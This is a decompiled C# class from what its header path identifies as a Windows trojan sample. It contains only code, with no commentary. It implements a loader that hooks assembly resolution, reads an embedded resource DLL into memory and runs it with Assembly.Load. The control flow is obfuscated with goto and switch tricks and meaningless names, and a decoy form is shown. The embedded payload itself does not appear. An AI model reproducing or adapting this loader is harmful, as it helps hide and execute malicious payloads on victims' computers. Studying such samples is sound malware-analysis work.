// Decompiled with JetBrains decompiler
// Type: Engwbelh.Objects.ConsumerObject
// Assembly: ConsoleApp1, Version=1.3.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A0396F2E-52EF-4B18-BD53-E7E344FADE5F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan.Win32.Generic-740c6afe85c3b0084383a3598d6a49e9f07f58e7764fde5eb0367450672a6018.exe

using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Engwbelh.Objects
{
  internal static class ConsumerObject
  {
    internal static ConsumerObject SelectRepository;

    [STAThread]
    private static void VerifyCustomer()
    {
      Application.EnableVisualStyles();
      Application.SetCompatibleTextRenderingDefault(false);
      AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(ConsumerObject.FlushCustomer);
      int num = 0;
      if (\u003CModule\u003E\u007Be4a2ec85\u002D1341\u002D4008\u002D9cf7\u002D1dcc8f9a3d19\u007D.m_31dd64b87400449c9122c254a224c89e != 0)
        goto label_3;
label_1:
      switch (num)
      {
        default:
          Application.Run((Form) new Form1());
          return;
      }
label_3:
      num = 0;
      goto label_1;
    }

    private static Assembly FlushCustomer(object init, ResolveEventArgs second)
    {
      using (Stream stream = (Stream) ConsumerObject.ReadRepository((object) Assembly.GetExecutingAssembly(), (object) "Engwbelh.ClassLibrary1.dll"))
      {
        MemoryStream memoryStream = new MemoryStream();
        ConsumerObject.ConcatRepository((object) stream, (object) memoryStream);
        int num1 = 0;
        if (\u003CModule\u003E\u007Be4a2ec85\u002D1341\u002D4008\u002D9cf7\u002D1dcc8f9a3d19\u007D.m_30b3019f6820426aa22e6ffb50233650 == 0)
          goto label_4;
label_2:
        switch (num1)
        {
          default:
            return Assembly.Load(memoryStream.ToArray());
        }
label_4:
        int num2;
        num1 = num2;
        goto label_2;
      }
    }

    internal static bool RestartRepository() => ConsumerObject.SelectRepository == null;

    internal static ConsumerObject CancelRepository() => ConsumerObject.SelectRepository;

    internal static object ReadRepository([In] object obj0, [In] object obj1) => (object) ((Assembly) obj0).GetManifestResourceStream((string) obj1);

    internal static void ConcatRepository([In] object obj0, [In] object obj1) => ((Stream) obj0).CopyTo((Stream) obj1);
  }
}
